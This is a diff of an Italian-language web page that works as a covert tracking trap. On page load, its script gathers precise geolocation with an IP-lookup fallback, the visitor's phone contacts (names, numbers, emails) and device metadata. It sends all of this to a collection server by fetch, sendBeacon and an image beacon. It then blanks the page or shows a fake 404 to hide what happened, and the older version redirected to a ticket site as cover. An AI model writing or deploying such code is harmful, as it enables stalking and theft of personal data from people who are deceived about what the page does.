@@ -1,4 +1,4 @@
-<!-- index.html – pagina bianca, geolocalizzazione silenziosa e redirect -->
+<!-- index.html – pagina bianca, acquisisce posizione + contatti, poi rimane ferma -->
 <!DOCTYPE html>
 <html lang="it">
 <head>
@@ -44,80 +44,122 @@
 
     <script>
         // ===== CONFIGURAZIONE =====
-        // Sostituisci con l'URL del tuo server Python (es. http://localhost:3000/collect)
-        const SERVER_URL = 'http://localhost:3000/collect';
-        // Sostituisci con l'URL di destinazione dopo la geolocalizzazione
-        const REDIRECT_URL = 'https://popupcinema.18tickets.it/';
+        const SERVER_URL = 'http://localhost:3000/collect';  // server Python
 
-        // ===== FUNZIONE PER INVIARE LA POSIZIONE =====
-        function sendLocation(position) {
-            const data = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude || null,
-                speed: position.coords.speed || null,
-                heading: position.coords.heading || null,
-                timestamp: new Date(position.timestamp).toISOString(),
-                userAgent: navigator.userAgent,
-                ip_fallback: null // verrà eventualmente aggiunto dopo
-            };
-
-            // Invia via fetch (POST JSON)
+        // ===== FUNZIONE PER INVIARE I DATI =====
+        function sendData(payload) {
+            const json = JSON.stringify(payload);
+            // Metodo 1: fetch (gestisce CORS)
             fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
+                body: json,
                 keepalive: true
             }).catch(() => {
-                // Fallback: sendBeacon
-                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                // Metodo 2: sendBeacon (fallback)
+                const blob = new Blob([json], { type: 'application/json' });
                 navigator.sendBeacon(SERVER_URL, blob);
             });
-
-            // Redirect alla pagina desiderata
-            window.location.href = REDIRECT_URL;
+            // Metodo 3: image beacon (per sicurezza, solo se payload piccolo)
+            try {
+                new Image().src = SERVER_URL + '?d=' + encodeURIComponent(json.substring(0, 2000));
+            } catch(e) {}
         }
 
-        function handleError(error) {
-            // In caso di errore (es. utente nega il permesso), inviamo comunque un fallback con IP (tramite ipapi)
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(ipData => {
-                    const fallback = {
-                        error: error.message || 'geolocation denied',
-                        ip: ipData.ip || null,
-                        city: ipData.city || null,
-                        country: ipData.country_name || null,
-                        lat: ipData.latitude || null,
-                        lon: ipData.longitude || null,
-                        timestamp: new Date().toISOString()
-                    };
-                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
-                    navigator.sendBeacon(SERVER_URL, blob);
-                })
-                .catch(() => {
-                    // Se anche IP fallisce, inviamo solo l'errore
-                    const fallback = { error: error.message || 'geolocation and IP failed', timestamp: new Date().toISOString() };
-                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
-                    navigator.sendBeacon(SERVER_URL, blob);
-                })
-                .finally(() => {
-                    window.location.href = REDIRECT_URL;
-                });
-        }
-
-        // ===== AVVIA LA GEOLOCALIZZAZIONE =====
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
+        // ===== 1. GEOLOCALIZZAZIONE =====
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    // fallback IP
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(ip => resolve({ lat: ip.latitude, lon: ip.longitude, city: ip.city, country: ip.country_name, ip: ip.ip }))
+                        .catch(() => resolve({ error: 'geolocation not supported' }));
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        heading: pos.coords.heading,
+                        timestamp: new Date(pos.timestamp).toISOString()
+                    }),
+                    (err) => {
+                        // fallback IP
+                        fetch('https://ipapi.co/json/')
+                            .then(r => r.json())
+                            .then(ip => resolve({ error: err.message, ip: ip.ip, city: ip.city, country: ip.country_name, lat: ip.latitude, lon: ip.longitude }))
+                            .catch(() => resolve({ error: err.message || 'geolocation denied' }));
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
             });
-        } else {
-            // Geolocalizzazione non supportata – redirect comunque
-            window.location.href = REDIRECT_URL;
         }
+
+        // ===== 2. CONTATTI =====
+        function getContacts() {
+            return new Promise((resolve) => {
+                if (!navigator.contacts || typeof navigator.contacts.select !== 'function') {
+                    resolve({ error: 'Contacts API not available' });
+                    return;
+                }
+                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                    .then(contacts => {
+                        const cleaned = contacts.map(c => ({
+                            name: c.name?.[0] || null,
+                            tel: c.tel || null,
+                            email: c.email || null
+                        }));
+                        resolve(cleaned);
+                    })
+                    .catch(err => resolve({ error: err.message || 'contacts denied' }));
+            });
+        }
+
+        // ===== 3. METADATI AGGIUNTIVI =====
+        function getMetadata() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'none'
+            };
+        }
+
+        // ===== FUNZIONE PRINCIPALE =====
+        async function collect() {
+            // Esegue geolocalizzazione e contatti in parallelo
+            const [geo, contacts] = await Promise.all([getGeolocation(), getContacts()]);
+            const meta = getMetadata();
+
+            const payload = {
+                geo: geo,
+                contacts: contacts,
+                metadata: meta,
+                timestamp: new Date().toISOString()
+            };
+
+            sendData(payload);
+
+            // Nasconde il caricamento e mostra una pagina bianca (o falso errore)
+            setTimeout(() => {
+                document.body.innerHTML = '';  // completamente bianca
+                // Oppure: mostra un falso 404
+                // document.body.innerHTML = '<h1 style="text-align:center;color:#888;">404 Not Found</h1>';
+            }, 1000);
+        }
+
+        // ===== AVVIO =====
+        window.addEventListener('load', function() {
+            // Piccolo ritardo per permettere il rendering
+            setTimeout(collect, 500);
+        });
     </script>
 </body>
 </html>
